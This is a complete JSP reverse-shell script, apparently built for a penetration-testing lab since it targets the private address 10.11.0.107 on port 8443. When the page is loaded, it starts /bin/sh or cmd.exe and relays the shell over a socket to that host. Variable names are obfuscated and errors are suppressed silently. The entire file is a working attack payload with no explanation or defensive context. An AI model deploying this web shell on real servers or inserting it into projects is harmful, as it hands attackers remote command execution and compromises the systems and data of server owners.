<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream gp;
    OutputStream aj;

    StreamConnector( InputStream gp, OutputStream aj )
    {
      this.gp = gp;
      this.aj = aj;
    }

    public void run()
    {
      BufferedReader pl  = null;
      BufferedWriter cra = null;
      try
      {
        pl  = new BufferedReader( new InputStreamReader( this.gp ) );
        cra = new BufferedWriter( new OutputStreamWriter( this.aj ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = pl.read( buffer, 0, buffer.length ) ) > 0 )
        {
          cra.write( buffer, 0, length );
          cra.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( pl != null )
          pl.close();
        if( cra != null )
          cra.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.11.0.107", 8443 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
